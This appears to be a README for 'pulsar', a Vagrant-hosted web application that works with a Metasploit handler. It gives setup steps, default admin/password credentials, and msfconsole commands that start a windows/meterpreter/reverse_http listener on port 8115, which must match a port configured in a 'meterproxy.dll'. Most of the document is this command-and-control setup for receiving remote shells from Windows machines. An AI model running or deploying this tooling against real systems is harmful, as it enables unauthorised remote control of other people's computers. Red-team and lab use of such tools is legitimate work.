pulsar
==============================

Requirements:

* Vagrant
* Virtualbox
* Ansible (brew install ansible)

Starting:

    $ vagrant up --provider virtualbox

The application should now be accessible at http://localhost:8000/. Default credentials are admin/password.

Metasploit Handler:

    $ vagrant ssh
    # msfconsole
    msf > use multi/handler
    msf exploit(handler) > set payload windows/meterpreter/reverse_http
    msf exploit(handler) > set LHOST 127.0.0.1
    msf exploit(handler) > set LPORT 8115
    msf exploit(handler) > exploit
    [*] Started HTTP reverse handler on http://0.0.0.0:8115/
    [*] Starting the payload handler...

LPORT should match HANDLER_PORT in config/settings/common.py, and the configured port in meterproxy.dll.
